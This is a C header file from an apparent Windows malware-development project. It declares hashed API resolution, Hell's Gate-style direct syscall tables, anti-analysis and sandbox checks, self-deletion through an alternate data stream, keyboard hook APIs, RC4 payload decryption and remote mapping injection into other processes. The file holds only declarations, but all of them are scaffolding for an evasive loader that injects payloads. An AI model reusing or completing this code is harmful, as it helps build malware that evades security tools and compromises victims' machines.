
#pragma once

#include <windows.h>

#ifndef COMMON_H
#define COMMON_H

#include "typedef.h"

#define MONITOR_TIME 20000

#define NEW_STREAM L":Maldev"

BOOL AntiAnalysis(DWORD dwMilliSeconds);

#ifndef __nop
#define __nop() __asm__ __volatile__("nop")
#endif

#define NtQuerySystemInformation_JOAA 0x7B9816D6
#define NtCreateSection_JOAA 0x192C02CE
#define NtMapViewOfSection_JOAA 0x91436663
#define NtUnmapViewOfSection_JOAA 0x0A5B9402
#define NtClose_JOAA 0x369BD981
#define NtCreateThreadEx_JOAA 0x8EC0B84A
#define NtWaitForSingleObject_JOAA 0x6299AD3D
#define NtDelayExecution_JOAA 0xB947891A

#define GetTickCount64_JOAA 0x00BB616E
#define OpenProcess_JOAA 0xAF03507E
#define CallNextHookEx_JOAA 0xB8B1ADC1
#define SetWindowsHookExW_JOAA 0x15580F7F
#define GetMessageW_JOAA 0xAD14A009
#define DefWindowProcW_JOAA 0xD96CEDDC
#define UnhookWindowsHookEx_JOAA 0x9D2856D0
#define GetModuleFileNameW_JOAA 0xAB3A6AA1
#define CreateFileW_JOAA 0xADD132CA
#define SetFileInformationByHandle_JOAA 0x6DF54277
#define CloseHandle_JOAA 0x9E5456F2

#define SystemFunction032_JOAA 0x8CFD40A8

#define KERNEL32DLL_JOAA 0xFD2AD9BD
#define USER32DLL_JOAA 0x349D72E7

#define INITIAL_SEED 8

UINT32 TheHashTheBashW(_In_ PWCHAR String);
UINT32 TheHashTheBashA(_In_ PCHAR String);

#define HASHA(API) (TheHashTheBashA((PCHAR)API))
#define HASHW(API) (TheHashTheBashW((PWCHAR)API))

CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

static inline int hex_is_digit(char c) {
  // ’0’–’9’, ’A’–’F’ or ’a’–’f’
  return (c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') ||
         (c >= 'a' && c <= 'f');
}

static inline unsigned char hex_value(char c) {
  if (c >= '0' && c <= '9')
    return c - '0';
  if (c >= 'A' && c <= 'F')
    return (c - 'A') + 10;
  // assume we only ever get valid hex
  return (c - 'a') + 10;
}

BOOL AmISandboxed(void);

typedef struct _VX_TABLE_ENTRY {
  PVOID pAddress;
  UINT32 uHash;
  WORD wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
    _In_ PVOID pModuleBase,
    _Out_ PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory);
BOOL GetVxTableEntry(_In_ PVOID pModuleBase,
                     _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
                     _In_ PVX_TABLE_ENTRY pVxTableEntry);

extern VOID TheDogHouse(WORD wSystemCall);
extern NTSTATUS TheFlagOfWudan();

#define KEY_SIZE 16
#define HINT_BYTE 0x61

BOOL Thebadmaninitialize();
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD *pdwPid,
                            IN HANDLE *phProcess);

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload,
                                       IN SIZE_T sPayloadSize, IN BOOL bLocal);

typedef struct _API_HASHING {

  fnGetTickCount64 pGetTickCount64;
  fnOpenProcess pOpenProcess;
  fnCallNextHookEx pCallNextHookEx;
  fnSetWindowsHookExW pSetWindowsHookExW;
  fnGetMessageW pGetMessageW;
  fnDefWindowProcW pDefWindowProcW;
  fnUnhookWindowsHookEx pUnhookWindowsHookEx;
  fnGetModuleFileNameW pGetModuleFileNameW;
  fnCreateFileW pCreateFileW;
  fnSetFileInformationByHandle pSetFileInformationByHandle;
  fnCloseHandle pCloseHandle;

} API_HASHING, *PAPI_HASHING;

typedef struct _VX_TABLE {

  VX_TABLE_ENTRY NtQuerySystemInformation;

  VX_TABLE_ENTRY NtCreateSection;
  VX_TABLE_ENTRY NtMapViewOfSection;
  VX_TABLE_ENTRY NtUnmapViewOfSection;
  VX_TABLE_ENTRY NtClose;
  VX_TABLE_ENTRY NtCreateThreadEx;
  VX_TABLE_ENTRY NtWaitForSingleObject;

  VX_TABLE_ENTRY NtDelayExecution;

} VX_TABLE, *PVX_TABLE;

#endif
